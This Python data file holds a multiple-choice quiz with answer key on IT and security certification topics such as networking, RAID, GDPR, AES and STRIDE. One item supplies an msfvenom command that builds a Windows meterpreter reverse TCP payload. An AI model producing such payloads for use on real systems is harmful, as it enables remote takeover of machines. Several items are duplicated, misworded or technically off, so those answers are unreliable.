quiz_data =[
    {
        "question": "What process adds a header and a footer to data received at each layer of the OSI model?",
        "correct_answer": "Encapsulation",
        "options": ["Encapsulation", "TCP Wrapping", "Attribution", "Data Hiding"]
    },
    {
        "question": "A process on a system needs access to a file that is currently in use by another process. What state will the process scheduler place this process in until the file becomes available?",
        "correct_answer": "Waiting",
        "options": ["Stopped", "Waiting", "Ready", "Running"]
    },
    {
        "question": "Which protocol is responsible for performing translations between FQDNs and IP addresses?",
        "correct_answer": "DNS",
        "options": ["ARP", "UDP", "TCP", "DNS"]
    },
    {
        "question": "What is the correct msfvenom command to generate a reverse TCP payload for Windows?",
        "correct_answer": "Msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.11.1.44 LPORT=6666 -f raw > shell.exe",
        "options": [
            "Msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.11.1.44 LPORT=6666 -f raw > shell.exe",
            "Msfvenom -p osx/x86/meterpreter/reverse_tcp LHOST=10.11.1.44 LPORT=6666 -f elf > shell.elf",
            "Msfvenom -p android/meterpreter/reverse_tcp LHOST=10.11.1.44 LPORT=6666 -f R > shell.apk",
            "Msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.1.44 LPORT=6666 -f elf > shell.elf"
        ]
    },
    {
        "question": "A cloud-based service that provides account provisioning, management, authentication, authorization, reporting, and monitoring capabilities is known as what type of service?",
        "correct_answer": "IDaaS",
        "options": ["PaaS", "IDaaS", "IaaS", "SaaS"]
    },
    {
        "question": "IP addresses such as 10.10.10.10 and 172.19.24.21 are both examples of what type of IP address?",
        "correct_answer": "Private IP addresses",
        "options": ["Public IP addresses", "Prohibited IP addresses", "Private IP addresses", "Class B IP ranges"]
    },
    {
        "question": "A process on a system needs access to a file that is currently in use by another process. What state will the process scheduler place this process in until the file becomes available?",
        "correct_answer": "Waiting",
        "options": ["Running", "Ready", "Waiting", "Stopped"]
    },
    {
        "question": "Which one of the following actions is not required under the EU General Data Protection Regulation?",
        "correct_answer": "Organisations must provide individuals with lists of employees with access to information",
        "options": [
            "Organisations must have a dispute resolution process for privacy issues",
            "Organisations must use proper mechanisms to protect data against unauthorised disclosure",
            "Organisations must provide individuals with lists of employees with access to information",
            "Organisations must allow individuals to opt out of information gathering"
        ]
    },
    {
        "question": "Which of the following is not an object-oriented programming language?",
        "correct_answer": "Fortran",
        "options": ["Fortran", "C++", "Java", "C#"]
    },
    {
        "question": "Which one of the following is not a valid key length for the Advanced Encryption System?",
        "correct_answer": "384 bits",
        "options": ["128 bits", "256 bits", "384 bits", "192 bits"]
    },
    {
        "question": "What level of RAID is known as disk stripping?",
        "correct_answer": "RAID 0",
        "options": ["RAID 5", "RAID 10", "RAID 0", "RAID 1"]
    },
    {
        "question": "What type of Windows audit record describes events such as an OS shutdown or a service being stopped?",
        "correct_answer": "A system log",
        "options": ["An application log", "A setup log", "A system log", "A security log"]
    },
    {
        "question": "The Open Shortest Path First (OSPF) protocol is a routing protocol that keeps a map of all connected remote networks and uses that map to select the shortest path to a remote destination. What type of routing protocol is OSPF?",
        "correct_answer": "Link state",
        "options": ["Shortest path first", "Distance vector", "Link Mapping", "Link state"]
    },
    {
        "question": "What principle of relational databases ensures the permanency of transactions that have successfully completed?",
        "correct_answer": "Durability",
        "options": ["Atomicity", "Consistency", "Isolation", "Durability"]
    },
    {
        "question": "What process is typically used to ensure data security for workstations that are being removed from service but that will be resold or otherwise reused?",
        "correct_answer": "Sanitisation",
        "options": ["Destruction", "Erasing", "Sanitisation", "Clearing"]
    },
    {
        "question": "Purchasing insurance is a form of what type of risk response?",
        "correct_answer": "Transfer",
        "options": ["Transfer", "Avoid", "Mitigate", "Accept"]
    },
    {
        "question": "After you do automated functional testing with 100 percent coverage of an application, what type of error is most likely to remain?",
        "correct_answer": "Business logic errors",
        "options": ["Error handling errors", "Business logic errors", "Input validation errors", "Runtime errors"]
    },
    {
        "question": "Attackers who compromise websites often acquire databases of hashed passwords. What technique can best protect these passwords against automated password cracking attacks that use precomputed values?",
        "correct_answer": "Salt",
        "options": ["Using the MD5 hashing algorithm", "Using the SHA-1 hashing algorithm", "Salt", "Double-salting"]
    },
    {
        "question": "Microsoftâ€™s STRIDE threat assessment framework uses six categories for threats: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, and Elevation of Privilege. If a penetration tester is able to modify audit logs, what STRIDE categories best describe this issue?",
        "correct_answer": "Repudiation and tampering",
        "options": ["Tampering and information", "Elevation of privilege and tampering", "Repudiation and denial of service", "Repudiation and tampering"]
    },
    {
        "question": "Johnny is designing a backup system and wants to implement RAID level 5 for his system. What is the minimum number of physical hard disks he can use to build this system?",
        "correct_answer": "3",
        "options": ["2", "1", "3", "5"]
    }
]
